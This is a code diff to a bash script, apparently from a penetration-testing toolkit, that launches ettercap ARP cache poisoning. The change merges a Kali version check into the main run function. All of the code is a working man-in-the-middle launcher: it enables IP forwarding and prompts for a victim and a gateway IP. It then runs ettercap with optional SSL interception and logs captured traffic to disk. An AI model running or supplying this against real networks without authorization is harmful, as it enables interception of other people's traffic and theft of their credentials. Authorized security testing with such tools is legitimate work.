@@ -39,52 +39,6 @@ f_generate_filename(){
   printf "/opt/pwnix/captures/ettercap/ettercap$(date +%F-%H%M)\n"
 }
 
-f_version_check(){
-   # Check for Kali1 version for target syntax change...
-  dpkg --list ettercap-common | grep -q 1:0.8.2-2~kali1
-  RETCODE=$?
-
-  if [ $RETCODE -eq 0 ]; then
-    f_run_kali1
-  else
-    f_run
-  fi
-}
-
-f_run_kali1(){
-  printf 1 > /proc/sys/net/ipv4/ip_forward
-
-  filename=$(f_generate_filename)
-
-  clear
-  printf "\n"
-  read -p "Enter target IP to ARP cache poison: " target1
-  printf "\n"
-
-  clear
-  printf "\n"
-  read -p "Enter target IP of gateway/router: " gw
-  printf "\n"
-
-  #ettercap fails if the interface is down
-  ip link set $interface up
-
-  if [ $logchoice -eq 1 ]; then
-    if [ $sslfakecert -eq 1 ]; then
-      ettercap -i $interface -T -q -l $filename -M arp:remote /$gw/ /$target1/
-    else
-      ettercap -i $interface -T -S -q -l $filename -M arp:remote /$gw/ /$target1/
-    fi
-  else
-    if [ $sslfakecert -eq 1 ]; then
-      ettercap -i $interface -T -q -M arp:remote /$gw/ /$target1/
-    else
-      ettercap -i $interface -T -S -q -M arp:remote /$gw/ /$target1/
-
-    fi
-  fi
-}
-
 f_run(){
   printf 1 > /proc/sys/net/ipv4/ip_forward
 
@@ -103,17 +57,25 @@ f_run(){
   #ettercap fails if the interface is down
   ip link set $interface up
 
+   # Check for Kali1 version for target syntax change...
+  dpkg --list ettercap-common | grep -q 1:0.8.2-2~kali1
+  if [ $? -eq 0 ]; then
+    syntax=""
+  else
+    syntax="/"
+  fi
+
   if [ $logchoice -eq 1 ]; then
     if [ $sslfakecert -eq 1 ]; then
-      ettercap -i $interface -T -q -l $filename -M arp:remote //$gw/ //$target1/
+      ettercap -i $interface -T -q -l $filename -M arp:remote ${syntax}/$gw/ ${syntax}/$target1/
     else
-      ettercap -i $interface -T -S -q -l $filename -M arp:remote //$gw/ //$target1/
+      ettercap -i $interface -T -S -q -l $filename -M arp:remote ${syntax}/$gw/ ${syntax}/$target1/
     fi
   else
     if [ $sslfakecert -eq 1 ]; then
-      ettercap -i $interface -T -q -M arp:remote //$gw/ //$target1/
+      ettercap -i $interface -T -q -M arp:remote ${syntax}/$gw/ ${syntax}/$target1/
     else
-      ettercap -i $interface -T -S -q -M arp:remote //$gw/ //$target1/
+      ettercap -i $interface -T -S -q -M arp:remote ${syntax}/$gw/ ${syntax}/$target1/
 
     fi
   fi
@@ -123,4 +85,4 @@ f_banner
 f_interface
 f_sslfake
 f_logging
-f_version_check
+f_run
